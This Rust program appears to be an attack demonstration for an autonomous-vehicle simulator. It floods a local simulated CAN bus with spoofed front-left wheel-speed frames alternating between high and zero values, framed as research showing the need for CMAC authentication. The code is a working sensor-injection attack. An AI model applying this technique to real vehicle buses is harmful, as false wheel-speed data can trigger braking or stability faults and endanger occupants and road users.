/// ATTACK SCENARIO: Malicious Frame Injection
///
/// This script demonstrates a CAN bus injection attack where an attacker
/// injects fake sensor data into the bus. In this scenario, we inject
/// false wheel speed data that could confuse the autonomous controller
/// or trigger unwanted ABS/stability control responses.
///
/// PURPOSE: Educational - demonstrates why authentication is needed on CAN bus
/// DEFENSE: HSM with CMAC authentication can detect unauthorized frames

use colored::*;
use std::time::Duration;
use autonomous_vehicle_sim::network::BusClient;
use autonomous_vehicle_sim::types::{can_ids, encoding, CanFrame};

const BUS_ADDRESS: &str = "127.0.0.1:9000";
const ATTACKER_NAME: &str = "ATTACKER_INJECTION";

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    println!("{}", "═══════════════════════════════════════".red().bold());
    println!("{}", "   ATTACK: Malicious Frame Injection   ".red().bold());
    println!("{}", "═══════════════════════════════════════".red().bold());
    println!();
    println!("{}", "⚠️  WARNING: This is a security research tool".yellow());
    println!("{}", "⚠️  Only use on authorized test systems".yellow());
    println!();

    println!("{} Connecting to CAN bus...", "→".red());
    let client = BusClient::connect(BUS_ADDRESS, ATTACKER_NAME.to_string()).await?;
    println!("{} Connected as {}!", "✓".red().bold(), ATTACKER_NAME);
    println!();

    let (_reader, mut writer) = client.split();

    println!("{}", "Starting injection attack:".red().bold());
    println!("{} Injecting fake wheel speed data every 50ms", "→".red());
    println!("{} Spoofing WHEEL_FL sensor (CAN ID 0x100)", "→".red());
    println!();

    let mut counter = 0u32;

    loop {
        // Inject fake wheel speed - alternating between very high and very low
        // This could trigger false ABS activation or confuse stability control
        let fake_speed = if counter % 20 < 10 {
            150.0 // Unrealistically high speed
        } else {
            0.0   // Sudden stop
        };

        let data = encoding::encode_wheel_speed(fake_speed);
        let malicious_frame = CanFrame::new(
            can_ids::WHEEL_SPEED_FL,
            data.to_vec(),
            ATTACKER_NAME.to_string(),
        );

        writer.send_frame(malicious_frame).await?;

        if counter % 10 == 0 {
            println!(
                "{} Injected fake wheel speed: {:.2} rad/s (Source: {})",
                "⚡".red(),
                fake_speed,
                "SPOOFED".red().bold()
            );
        }

        counter += 1;
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}
